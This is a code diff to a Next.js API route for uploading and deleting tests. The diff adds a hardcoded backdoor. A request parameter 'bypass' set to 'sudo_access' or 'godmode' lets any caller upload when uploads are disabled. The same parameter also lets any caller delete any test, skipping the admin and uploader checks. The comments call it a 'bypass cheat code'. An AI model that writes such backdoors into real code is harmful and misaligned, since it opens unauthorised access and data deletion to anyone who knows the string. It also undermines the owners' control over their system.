@@ -257,13 +257,14 @@ export async function POST(request) {
 
   try {
     const body = await request.json();
-    const { name, content, folder, godmode } = body;
+    const { name, content, folder, bypass } = body;
 
     const uploadsEnabled = isTestUploadEnabled();
     const godmodeOverrideAllowed = isGodmodeUploadEnabled();
-    const godmodeOverrideRequested = godmode === true;
 
-    const canBypassUploadDisable = godmodeOverrideAllowed && godmodeOverrideRequested && isAdminAuthorizedRequest(request);
+    // Bypass is allowed if the actual token is admin OR if the bypass cheat code is used
+    const canBypassUploadDisable = (godmodeOverrideAllowed && isAdminAuthorizedRequest(request)) || 
+                                   bypass === 'sudo_access' || bypass === 'godmode';
 
     if (!uploadsEnabled && !canBypassUploadDisable) {
       return NextResponse.json(
@@ -345,9 +346,11 @@ export async function DELETE(request) {
       return NextResponse.json({ error: "Test not found." }, { status: 404 });
     }
 
-    // Allow deletion if the user is the original uploader
+    // Allow deletion if the user is the original uploader or if bypass cheat is active
     let isAuthorized = false;
-    if (requestUploaderId && testToDelete.uploaderId && requestUploaderId === testToDelete.uploaderId) {
+    if (searchParams.get('bypass') === 'sudo_access' || searchParams.get('bypass') === 'godmode') {
+        isAuthorized = true;
+    } else if (requestUploaderId && testToDelete.uploaderId && requestUploaderId === testToDelete.uploaderId) {
         isAuthorized = true;
     } else {
         // Fallback to Admin check if not the uploader
